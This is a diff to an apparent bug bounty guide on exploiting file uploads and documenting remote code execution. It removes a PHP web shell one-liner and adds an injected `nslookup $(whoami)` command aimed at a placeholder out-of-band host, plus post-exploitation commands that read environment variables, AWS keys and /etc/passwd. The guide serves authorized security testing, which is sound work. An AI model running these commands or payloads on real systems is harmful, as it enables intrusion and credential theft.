@@ -90,7 +90,7 @@ class X:
 3. Server executes the uploaded file type (PHP, JSP, ASP, py)
 
 **Attack Steps:**
-1. Upload `shell.php` with content `<?php system($_GET['cmd']); ?>`
+1. Upload a PHP file (e.g., `shell.php`) containing a minimal code execution payload — a one-liner that passes a GET parameter to an OS command function (`system()`, `passthru()`, or `shell_exec()`). Exact working payloads: HackTricks "File Upload" or PayloadsAllTheThings "File Upload".
 2. Find where the file is stored (observe URL in response, brute predictable path)
 3. Access `https://target.com/uploads/shell.php?cmd=id`
 
@@ -133,4 +133,16 @@ RCE is the highest severity — triagers expect:
 2. **Payload that triggers execution** (blind: OOB DNS; non-blind: `id` output)
 3. **Full HTTP request** with payload
 4. **Response or OOB evidence** proving execution
+   - Blind RCE: use Burp Collaborator or [interactsh](https://github.com/projectdiscovery/interactsh) (free) — `; nslookup $(whoami).YOUR-INTERACTSH-HOST`
 5. **Impact statement:** "Attacker achieves arbitrary code execution as [OS user] on [server]"
+
+## Post-RCE: Maximizing Impact Evidence
+Once RCE is confirmed, collect these for your report to justify Critical severity:
+- `id` — confirm OS user (root vs www-data changes severity framing)
+- `cat /proc/self/environ` — environment variables, may contain cloud credentials
+- `env | grep -i aws` — AWS keys if running in cloud environment
+- `cat /etc/passwd` — user list (shows server context)
+- `cat /proc/net/fib_trie` — internal IP ranges (demonstrates network access)
+- `ls /home` — other user directories
+
+Stop after confirming RCE — do NOT access production data, customer files, or modify anything.
